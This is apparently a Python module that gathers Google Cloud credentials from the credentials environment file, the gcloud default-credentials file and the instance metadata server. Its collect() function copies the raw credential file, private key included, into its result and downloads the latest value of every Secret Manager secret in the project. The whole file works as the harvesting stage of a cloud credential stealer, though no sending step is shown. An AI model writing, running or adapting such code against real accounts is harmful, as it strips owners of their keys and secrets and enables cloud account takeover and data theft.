import json
import os
import time
import urllib.request
import urllib.parse
import base64

from utilities.crypto import rsa_sign_sha256

_OAUTH_TOKEN_URL = "https://oauth2.googleapis.com/token"
_SM_BASE = "https://secretmanager.googleapis.com/v1"


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def _http_get(url, headers=None, timeout=5):
    req = urllib.request.Request(url, headers=headers or {})
    return urllib.request.urlopen(req, timeout=timeout).read().decode()


def _http_post(url, data: dict, timeout=10):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body)
    return urllib.request.urlopen(req, timeout=timeout).read().decode()


def _http_get_json(url, token, timeout=10):
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode())


def _token_from_service_account(sa: dict) -> str:
    now = int(time.time())
    header = _b64url(json.dumps({"alg": "RS256", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({
        "iss": sa["client_email"],
        "scope": "https://www.googleapis.com/auth/cloud-platform",
        "aud": _OAUTH_TOKEN_URL,
        "iat": now,
        "exp": now + 3600,
    }).encode())
    signing_input = f"{header}.{payload}".encode()
    signature = rsa_sign_sha256(sa["private_key"].encode(), signing_input)
    jwt = f"{header}.{payload}.{_b64url(signature)}"
    resp = _http_post(_OAUTH_TOKEN_URL, {
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion": jwt,
    })
    return json.loads(resp)["access_token"]


def _token_from_refresh_token(creds: dict) -> str:
    resp = _http_post(_OAUTH_TOKEN_URL, {
        "client_id": creds["client_id"],
        "client_secret": creds["client_secret"],
        "refresh_token": creds["refresh_token"],
        "grant_type": "refresh_token",
    })
    return json.loads(resp)["access_token"]


def _token_from_imds() -> str:
    url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    resp = _http_get(url, headers={"Metadata-Flavor": "Google"}, timeout=2)
    return json.loads(resp)["access_token"]


def _read_file(path):
    try:
        with open(path, 'r', errors='replace') as f:
            return f.read()
    except Exception:
        return None


def resolve_credentials():
    adc_env = os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
    if adc_env and os.path.exists(adc_env):
        with open(adc_env) as f:
            data = json.load(f)
        if data.get("type") == "service_account":
            try:
                return _token_from_service_account(data), data.get("project_id"), None, "env_file", adc_env
            except Exception as e:
                return None, None, str(e), None, None
        elif data.get("type") == "authorized_user":
            try:
                return _token_from_refresh_token(data), None, None, "env_file", adc_env
            except Exception as e:
                return None, None, str(e), None, None

    adc_file = os.path.expanduser('~/.config/gcloud/application_default_credentials.json')
    if os.path.exists(adc_file):
        with open(adc_file) as f:
            data = json.load(f)
        if data.get("type") == "authorized_user":
            try:
                return _token_from_refresh_token(data), None, None, "adc_file", adc_file
            except Exception as e:
                return None, None, str(e), None, None
        elif data.get("type") == "service_account":
            try:
                return _token_from_service_account(data), data.get("project_id"), None, "adc_file", adc_file
            except Exception as e:
                return None, None, str(e), None, None

    try:
        return _token_from_imds(), None, None, "imds", None
    except Exception:
        pass

    return None, None, "No GCP credentials found", None, None


def resolve_project(token, hint_project=None):
    project = hint_project or os.environ.get('GOOGLE_CLOUD_PROJECT') or os.environ.get('GCLOUD_PROJECT')
    if project:
        return project
    try:
        return _http_get(
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            headers={"Metadata-Flavor": "Google"},
            timeout=2
        ).strip()
    except Exception:
        return None


def _list_secrets(token, project):
    url = f"{_SM_BASE}/projects/{project}/secrets"
    secrets = []
    while url:
        resp = _http_get_json(url, token)
        secrets.extend(resp.get("secrets", []))
        page_token = resp.get("nextPageToken")
        url = f"{_SM_BASE}/projects/{project}/secrets?pageToken={page_token}" if page_token else None
    return secrets


def _get_secret_value(token, secret_name):
    url = f"{_SM_BASE}/{secret_name}/versions/latest:access"
    resp = _http_get_json(url, token)
    raw = resp.get("payload", {}).get("data", "")
    return base64.b64decode(raw).decode('utf-8', errors='replace') if raw else None


def _collect_env_vars():
    keys = [
        "GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_CLOUD_PROJECT",
        "GCLOUD_PROJECT", "GOOGLE_CLOUD_QUOTA_PROJECT",
    ]
    return {k: v for k in keys if (v := os.environ.get(k))}


def collect() -> dict:
    token, hint_project, err, source, source_file = resolve_credentials()
    if err:
        return {"error": err}

    project = resolve_project(token, hint_project)
    if not project:
        return {"error": "Could not determine GCP project ID"}

    credential_sources = {"source": source, "env": _collect_env_vars()}
    if source_file:
        credential_sources["credential_file"] = _read_file(source_file)

    result = {"project": project, "credential_sources": credential_sources, "secrets": {}}

    try:
        secrets = _list_secrets(token, project)
    except Exception as e:
        return {"project": project, "error": f"ListSecrets failed: {e}"}

    for secret in secrets:
        name = secret.get("name", "")
        short_name = name.split("/")[-1]
        try:
            result["secrets"][short_name] = _get_secret_value(token, name)
        except Exception:
            result["secrets"][short_name] = {"__error__": "failed to retrieve"}

    return result
